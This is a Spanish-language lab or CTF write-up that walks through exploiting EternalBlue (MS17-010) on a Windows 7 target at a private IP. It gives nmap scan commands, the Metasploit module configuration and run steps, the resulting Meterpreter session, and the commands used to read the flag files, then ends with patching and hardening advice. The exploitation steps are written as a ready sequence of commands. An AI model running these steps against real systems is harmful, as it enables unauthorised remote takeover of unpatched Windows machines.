# **Explotación de EternalBlue (MS17-010)**

![Nivel: Medio](https://img.shields.io/badge/Nivel-Medio-orange) ![Tema: SMB Exploitation + Windows Privilege Escalation](https://img.shields.io/badge/Tema-SMB%20Exploitation%20%2B%20Windows%20PrivEsc-blue)

## **Descripción**
Este repositorio documenta la explotación completa de la vulnerabilidad **EternalBlue** (MS17-010) que afecta a sistemas Windows sin parches, incluyendo:
1. Detección de vulnerabilidad SMB
2. Explotación con Metasploit Framework
3. Obtención de shell interactivo
4. Extracción de flags de usuario y root

**Tiempo estimado**: 20-30 minutos  
**Dificultad**: Medio  
**Sistema operativo**: Windows

## **Índice**
1. [Reconocimiento](#reconocimiento)
2. [Detección de Vulnerabilidad](#detección-de-vulnerabilidad)
3. [Explotación con Metasploit](#explotación-con-metasploit)
4. [Acceso Inicial](#acceso-inicial)
5. [Extracción de Flags](#extracción-de-flags)
6. [Conclusión](#conclusión)

## **Reconocimiento**

### 1. Escaneo de Puertos
```bash
nmap -p- --open -sS -sC -sV --min-rate 5000 -n -vvv -Pn 10.0.2.13 -oN escaneo
```

**Resultados**:
- **Puerto 135/tcp**: MSRPC
- **Puerto 139/tcp**: NetBIOS-SSN
- **Puerto 445/tcp**: SMB - Microsoft Windows 7/Server 2008 R2
- **Puerto 49152/tcp**: MSRPC

### 2. Identificación del Sistema
- **Sistema operativo**: Windows 7/Server 2008 R2
- **Servicio vulnerable**: SMBv1

## **Detección de Vulnerabilidad**

### 3. Escaneo de Vulnerabilidades SMB
```bash
nmap --script "vuln" 10.0.2.13 -p 445 -oN vuln_scan
```

**Hallazgo crítico**:
```
VULNERABLE:
MS17-010: VULNERABLE
```

### 4. Verificación con Script Específico
```bash
nmap --script smb-vuln-ms17-010 10.0.2.13 -p 445
```

## **Explotación con Metasploit**

### 5. Inicio de Metasploit
```bash
msfconsole
```

### 6. Búsqueda del Exploit
```bash
search eternalblue
```

### 7. Configuración del Exploit
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.0.2.13
set LHOST tun0
options
```

### 8. Ejecución del Exploit
```bash
run
# o
exploit
```

## **Acceso Inicial**

### 9. Obtención de Sesión Meterpreter
**Resultado exitoso**:
```
[*] Meterpreter session 1 opened
```

### 10. Verificación de Acceso
```bash
getuid
sysinfo
```

## **Extracción de Flags**

### 11. Navegación al Directorio de Usuario
```bash
cd C:\\
cd Users
cd mike
cd Desktop
dir
```

### 12. Flag de Usuario
```bash
type user.txt
```
- **User Flag**: `[Redacted]`

### 13. Flag de Root/Administrator
```bash
cd C:\\
cd Users
cd Administrator
cd Desktop
dir
type root.txt
```
- **Root Flag**: `[Redacted]`

## **Conclusión**

### Vulnerabilidades Críticas
1. **Sistema sin parche MS17-010**
2. **SMBv1 habilitado y expuesto**
3. **Configuración insegura de servicios de red**

### Hardening Recomendado
- Aplicar parche MS17-010 inmediatamente
- Deshabilitar SMBv1 si no es necesario
- Implementar segmentación de red
- Actualizar a versiones soportadas de Windows
- Implementar firewall para restringir acceso SMB

### Técnicas Aplicadas
1. **Escaneo de vulnerabilidades** con Nmap
2. **Explotación de SMB** con Metasploit
3. **Manejo de sesiones** Meterpreter
4. **Navegación en sistemas Windows**

---

**Herramientas utilizadas**:
- Nmap
- Metasploit Framework
- Meterpreter
- Scripts de vulnerabilidad NSE

**Referencias**:
- [CVE-2017-0144](https://nvd.nist.gov/vuln/detail/CVE-2017-0144)
- [MS17-010 Bulletin](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)
- [Metasploit EternalBlue Module](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/)

**Tags**: `#EternalBlue #MS17-010 #SMB #Windows #Metasploit #Meterpreter #PrivEsc #CTF`

---

## **Lecciones Aprendidas**
- La falta de parches de seguridad expone sistemas críticos
- SMBv1 es inherentemente inseguro y debe deshabilitarse
- Las herramientas de escaneo automatizado son esenciales para la detección
- Metasploit proporciona exploits confiables para vulnerabilidades conocidas
- La post-explotación en Windows requiere conocimiento de la estructura de directorios

## **Notas Adicionales**
- Esta vulnerabilidad fue utilizada en el ataque WannaCry
- Microsoft emitió parche en marzo de 2017
- Sistemas sin actualizar siguen siendo vulnerables
